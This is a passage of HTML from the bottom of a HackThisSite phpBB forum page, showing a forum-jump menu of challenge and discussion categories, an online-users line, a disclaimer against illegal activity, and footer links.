							<option value="63">&nbsp; &nbsp;&nbsp; &nbsp;(Real 13) Elbonian Republican Party</option>
							<option value="62">&nbsp; &nbsp;&nbsp; &nbsp;(Real 14) Yuppers Internet Solutions</option>
							<option value="61">&nbsp; &nbsp;&nbsp; &nbsp;(Real 15) seculas Ltd.</option>
							<option value="60">&nbsp; &nbsp;&nbsp; &nbsp;(Real 16) Simple Mail</option>
							<option value="59">&nbsp; &nbsp;&nbsp; &nbsp;Hack This Site</option>
							<option value="16">&nbsp; &nbsp;Application</option>
							<option value="19">&nbsp; &nbsp;Programming</option>
							<option value="22">&nbsp; &nbsp;Extended Basics</option>
							<option value="21">&nbsp; &nbsp;Javascript</option>
							<option value="20">&nbsp; &nbsp;Steganography</option>
							<option value="23">&nbsp; &nbsp;IRC Missions</option>
							<option value="147">&nbsp; &nbsp;Forensic</option>
							<option value="157">&nbsp; &nbsp;User Submitted</option>
							<option value="17">Computers</option>
							<option value="31">&nbsp; &nbsp;Operating Systems</option>
							<option value="26">&nbsp; &nbsp;&nbsp; &nbsp;Microsoft Windows</option>
							<option value="27">&nbsp; &nbsp;&nbsp; &nbsp;*nix</option>
							<option value="124">&nbsp; &nbsp;&nbsp; &nbsp;Mac</option>
							<option value="24">&nbsp; &nbsp;Networking</option>
							<option value="28">&nbsp; &nbsp;Crypto</option>
							<option value="29">&nbsp; &nbsp;Malware</option>
							<option value="35">&nbsp; &nbsp;Telecommunications</option>
							<option value="151">&nbsp; &nbsp;&nbsp; &nbsp;Android</option>
							<option value="152">&nbsp; &nbsp;&nbsp; &nbsp;iOS</option>
							<option value="153">&nbsp; &nbsp;&nbsp; &nbsp;Windows</option>
							<option value="154">&nbsp; &nbsp;&nbsp; &nbsp;Blackberry</option>
							<option value="36">&nbsp; &nbsp;Programming</option>
							<option value="102">&nbsp; &nbsp;&nbsp; &nbsp;C and C++</option>
							<option value="104">&nbsp; &nbsp;&nbsp; &nbsp;Interpreted Languages</option>
							<option value="156">&nbsp; &nbsp;&nbsp; &nbsp;Custom Code</option>
							<option value="38">&nbsp; &nbsp;Web</option>
							<option value="116">&nbsp; &nbsp;Social Engineering</option>
							<option value="40">Philosophy</option>
							<option value="41">&nbsp; &nbsp;Politics</option>
							<option value="42">&nbsp; &nbsp;Ethics</option>
							<option value="43">&nbsp; &nbsp;General</option>
							<option value="67">&nbsp; &nbsp;Religion</option>
							<option value="68">&nbsp; &nbsp;Math &amp; Science</option>
							<option value="90">Graphic Design &amp; Web Design</option>
							<option value="92">&nbsp; &nbsp;General design</option>
							<option value="98">&nbsp; &nbsp;Web Design</option>
							<option value="99">&nbsp; &nbsp;Modeling and Animation</option>
						</select>
			<input type="submit" value="Go" class="button2" />
		</fieldset>
	</form>

	<h3><a href="./viewonline.php?sid=ac52ce0dee166a53bc0b12347be02a31">Who is online</a></h3>
	<p>Users browsing this forum: No registered users and 0 guests</p>
</div>

<div id="page-footer">
			<div class="rules">
			<div class="inner"><span class="corners-top"><span></span></span>
			<dl>
				<dd><strong>Disclaimer : </strong></dd><dd>HackThisSite does not support illegal activities.<br />The management of this board is not responsible for the content of any external internet sites.</dd>
			</dl>
			<span class="corners-bottom"><span></span></span></div>
		</div>
	
	<div class="navbar">
		<div class="inner"><span class="corners-top"><span></span></span>

		<ul class="linklist">
			<li class="icon-home"><a href="./index.php?sid=ac52ce0dee166a53bc0b12347be02a31" accesskey="h">Board index</a></li>
							<li class="rightside"><a href="./memberlist.php?mode=leaders&amp;sid=ac52ce0dee166a53bc0b12347be02a31">The team</a> &bull; <a href="./ucp.php?mode=delete_cookies&amp;sid=ac52ce0dee166a53bc0b12347be02a31">Delete all board cookies</a> &bull; All times are UTC - 5 hours </li>
		</ul>

		<span class="corners-bottom"><span></span></span></div>
	</div>

	<div class="copyright">Powered by <a href="http://www.phpbb.com/">phpBB</a> &copy; 2000-2009 phpBB Group
      <div class="copyright">Carbon Style By Echo <a href="http://www.echological.com">-=Designs By Echo=-</a> &copy; 2007 Echo
		 	<br /><strong><a href="./acp/index.php?sid=ac52ce0dee166a53bc0b12347be02a31">Administration Control Panel</a></strong>
			</div>
</div>

</div>

<div>
	<a id="bottom" name="bottom" accesskey="z"></a>
	</div>

</body>
</html>
